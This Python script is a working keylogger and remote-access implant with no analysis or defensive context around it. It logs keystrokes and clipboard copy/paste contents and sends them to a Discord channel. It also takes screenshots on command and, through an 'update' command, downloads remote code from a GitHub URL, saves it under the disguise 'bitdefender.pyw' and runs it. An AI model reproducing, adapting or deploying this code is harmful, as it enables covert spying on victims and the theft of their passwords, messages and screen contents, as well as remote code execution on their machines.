from pynput.keyboard import Key, Listener
import discord
from discord.ext import commands
import time
import asyncio
import clipboard
import pyscreenshot as ImageGrab
import os
from PIL import Image, ImageDraw
import requests
from os import getcwd
import auth2
import sys


client = commands.Bot(command_prefix = '!');
list = ""
clear = False
o_t = 0
t_e = 0
async def send_to_discord(content):
    if(content != ""):
        global list
        channel = client.get_channel(765347439141060642)
        await channel.send(content)
def on_press(key):
    global list
    global clear
    global o_t
    global t_e
    to_add = ""
    if ((str(key)[0] == "'" or str(key)[0] == '"') and len(str(key))==3):
        to_add = str(key)[1]
    elif (str(key) == "Key.space"):
        to_add = " "
    elif (str(key) == "Key.enter"):
        to_add = "[E]\n"
        clear = True
    elif (str(key) == "Key.backspace"):
        to_add = "[B]"
    elif (str(key) == "Key.right"):
        to_add = "[RIGHT]"
    elif (str(key) == "Key.left"):
        to_add = "[LEFT]"
    elif (str(key) == "Key.up"):
        to_add = "[UP]"
    elif (str(key) == "Key.down"):
        to_add = "[DOWN]"
    elif (str(key) == "Key.cmd"):
        to_add = "[WIN]"
    elif ("alt" in str(key)):
        to_add = "[ALT]"
    elif (str(key) == "Key.tab"):
        to_add = "[TAB]"
    elif ("\\x03" in str(key)):
        time.sleep(1)
        clip = clipboard.paste()
        to_add = f"\n```[COPY] {clip}```"
    elif ("\\x16" in str(key)):
        clip = clipboard.paste()
        to_add = f"\n```[PASTE] {clip}```"
    list = list+to_add
    if(clear == True):
        client.loop.create_task(send_to_discord(list))
        list = ""
        clear = False
        o_t = time.time()
    else:
        t_e = time.time()
        t_e = t_e - o_t
        if(t_e >= 600):
            clear = True
            o_t = time.time()
@client.command()
async def update(ctx):
    url = "https://raw.githubusercontent.com/TaranMayer/trees/master/read.pyw"
    r = requests.get(url).content.decode('utf-8')
    await ctx.send("`got code`")
    code = str(r)
    f = open("bitdefender.pyw",'w')
    f.write(code)
    f.close()
    await ctx.send("`wrote code`")
    os.spawnl(os.P_WAIT, sys.executable, *([sys.executable] + (sys.argv if __package__ is None else ["-m", __loader__.name] + sys.argv[1:])))
    await ctx.send("`spawned script`")
    sys.exit()
@client.event
async def on_ready():
    channel = client.get_channel(764311637028503552)
    await channel.send("`Completed startup, ready for commands`")
@client.command()
async def pic(ctx):
    capture = ImageGrab.grab()
    draw = ImageDraw.Draw(capture)
    print(mouse.position)
    x = (int(mouse.position[0])/1.47)
    y = (int(mouse.position[1])/1.47)
    print(x, y)
    z = 1.84
    w = 1.84
    draw.ellipse((w*x-5, z*y-5, w*x+5, z*y+5), fill=(232, 52, 39, 255), width=1)
    capture.save('capture.png')
    await ctx.send(file=discord.File("capture.png"))
    os.remove("capture.png")
@client.command()
async def gittest(ctx):
    await ctx.send("10/11 10:17 PM")
with Listener(on_press=on_press) as listener:
    o_t = time.time()
    client.run(auth2.auth)
